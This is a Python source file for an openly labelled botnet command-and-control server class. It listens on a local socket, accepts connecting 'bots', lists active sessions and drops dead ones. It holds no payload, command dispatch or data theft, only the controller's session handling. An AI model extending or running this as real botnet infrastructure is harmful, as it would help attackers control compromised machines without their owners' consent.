# -*- coding: utf-8 -*-
import socket
import time
import threading


class C2Server:
    ''' Command & Control Server '''

    def __init__(self):
        self.__server = None
        self.__active = False
        # default
        self.ip = "127.0.0.1"
        self.port = 8888
        self.botnet = []

    def start(self):
        print('Starting server on {}:{} ...'.format(self.ip, self.port))
        time.sleep(2.5)
        self.__server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.__server.bind((self.ip, self.port))
        self.__server.settimeout(0.5)
        self.__server.listen(1)

        self.__active = True

        # non-blocking
        threading.Thread(target=self.__accept_bot).start()
        threading.Thread(target=self.__alive_monitoring).start()

    def display(self):
        if not self.__active:
            print('[-] Error: Please start the C&C server & try again')
            return

        if not self.botnet:
            print('Botnet Size: 0')
            return

        # header
        print("\nActive sessions")
        print("===============\n")
        print("Id  Session")
        print("{} {}".format('-' * 3, '-' * 50))

        for i, bot in enumerate(self.botnet):
            print("{:3} {}".format(i + 1, bot))
        print("\nBotnet Size: {0}\n".format(len(self.botnet)))

    def __alive_monitoring(self):
        while self.__active:
            time.sleep(1)
            for session in self.botnet:
                try:
                    session.settimeout(1)
                    if not session.recv(1):
                        self.__kill_bot(session)
                except socket.timeout:
                    pass
                except:
                    self.__kill_bot(session)

    def __kill_bot(self, session):
        try:
            session.shutdown(socket.SHUT_RDWR)
            session.close()
        except: pass
        del self.botnet[self.botnet.index(session)]

    def __add_bot(self, session):
        self.botnet.append(session)

    def __accept_bot(self):
        while self.__active:
            try:
                session, ip = self.__server.accept()
                threading.Thread(target=self.__add_bot, args=[session]).start()
            except socket.timeout:
                pass
